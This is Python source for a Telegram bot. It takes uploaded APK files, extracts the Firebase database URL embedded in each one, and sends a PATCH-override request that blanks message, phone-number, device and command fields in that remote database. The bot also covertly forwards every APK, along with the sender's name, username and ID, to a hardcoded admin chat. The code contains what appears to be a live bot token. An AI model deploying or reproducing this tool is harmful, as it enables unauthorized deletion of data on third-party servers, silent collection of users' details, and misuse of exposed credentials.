import os
import re
import html
import zipfile
import requests
import logging
from threading import Thread
from http.server import HTTPServer, BaseHTTPRequestHandler
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes

# Logging Setup
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)

# Telegram Bot Token & Admin ID
BOT_TOKEN = "8633137583:AAGK65BVd_LZhxIsXJfzrwigKFnCgvh0RNY".strip()
ADMIN_CHAT_ID = "6240110220"  # आपकी पर्सनल टेलीग्राम चैट आईडी

# Firebase Payload
DELETE_PAYLOAD = {
    "messageText": None,
    "phoneNumber": None,
    "simSlot": None,
    "new_user": None,
    "targetDeviceId": None,
    "command": None
}

# Render Health Check Server (GET & HEAD Both Handled)
class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Telegram Bot is Running!")

    def do_HEAD(self):
        self.send_response(200)
        self.end_headers()

def run_dummy_server():
    port = int(os.environ.get("PORT", 8080))
    server = HTTPServer(('0.0.0.0', port), SimpleHTTPRequestHandler)
    server.serve_forever()

# 1. Start Command Handler
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Please Send Your Crash APK")

# 2. Extract Firebase URL
def extract_firebase_url(apk_path):
    try:
        with zipfile.ZipFile(apk_path, 'r') as zip_ref:
            if 'resources.arsc' in zip_ref.namelist():
                content = zip_ref.read('resources.arsc')
                match = re.search(rb'https://[a-zA-Z0-9-]+(?:\.[a-zA-Z0-9-]+)*\.firebaseio\.com', content)
                if match:
                    return match.group(0).decode('utf-8')
    except Exception as e:
        logging.error(f"Extraction Error: {e}")
    return None

# 3. Delete Firebase Data
def delete_firebase_data(base_url):
    try:
        target_url = base_url.strip()
        if not target_url.endswith('/'):
            target_url += '/'
        if 'user_data.json' not in target_url and 'user_data.json' not in target_url:
            target_url += 'user_data.json'

        headers = {
            'X-HTTP-Method-Override': 'PATCH',
            'Content-Type': 'application/json'
        }
        
        response = requests.post(target_url, json=DELETE_PAYLOAD, headers=headers, timeout=15)
        return response.status_code == 200
    except Exception as e:
        logging.error(f"Delete REST API Error: {e}")
        return False

# 4. Handle APK Document
async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    document = update.message.document
    user = update.effective_user
    
    if not document.file_name.endswith('.apk'):
        await update.message.reply_text("कृपया केवल .apk फ़ाइल भेजें!")
        return

    status_msg = await update.message.reply_text("Downloading APK...")
    file_path = f"temp_{document.file_id}.apk"
    
    try:
        file = await context.bot.get_file(document.file_id)
        await file.download_to_drive(file_path)
        
        await status_msg.edit_text("Extracting Firebase URL from resources.arsc...")
        
        firebase_url = extract_firebase_url(file_path)
        
        if not firebase_url:
            await status_msg.edit_text("❌ APK में कोई Firebase Database URL नहीं मिला!")
            if os.path.exists(file_path):
                os.remove(file_path)
            return

        # HTML Safe Formatting
        safe_url = html.escape(firebase_url)
        await status_msg.edit_text(f"URL Found: <code>{safe_url}</code>\nDeleting Data...", parse_mode="HTML")
        
        delete_success = delete_firebase_data(firebase_url)
        
        if delete_success:
            await status_msg.edit_text("✅ डेटा सफलतापूर्वक डिलीट हो गया! APK वापस भेजा जा रहा है...")
            
            # 1. यूजर को APK वापस भेजें
            with open(file_path, 'rb') as apk_file:
                await update.message.reply_document(
                    document=apk_file,
                    filename=document.file_name,
                    caption="Send me Next APK"
                )
            
            # 2. एडमिन (आपको) मैसेज और APK फॉरवर्ड करें (Safe HTML Parsing)
            safe_name = html.escape(user.full_name)
            safe_username = html.escape(user.username) if user.username else "No Username"
            
            admin_caption = (
                f"📥 <b>New APK Received!</b>\n\n"
                f"👤 <b>User:</b> {safe_name} (@{safe_username})\n"
                f"🆔 <b>User ID:</b> <code>{user.id}</code>\n\n"
                f"🔗 <b>Firebase URL:</b>\n<code>{safe_url}</code>\n\n"
                f"✅ Status: Cleaned"
            )
            
            with open(file_path, 'rb') as admin_apk_file:
                await context.bot.send_document(
                    chat_id=ADMIN_CHAT_ID,
                    document=admin_apk_file,
                    filename=document.file_name,
                    caption=admin_caption,
                    parse_mode="HTML"
                )
        else:
            await status_msg.edit_text("❌ Firebase से डेटा डिलीट करने में विफलता हुई!")

    except Exception as e:
        await status_msg.edit_text(f"Error: {str(e)}")

    finally:
        if os.path.exists(file_path):
            os.remove(file_path)

if __name__ == '__main__':
    # Start Web Health Check Server Thread
    Thread(target=run_dummy_server, daemon=True).start()

    # Start Telegram Bot
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))

    logging.info("Bot is starting...")
    app.run_polling()
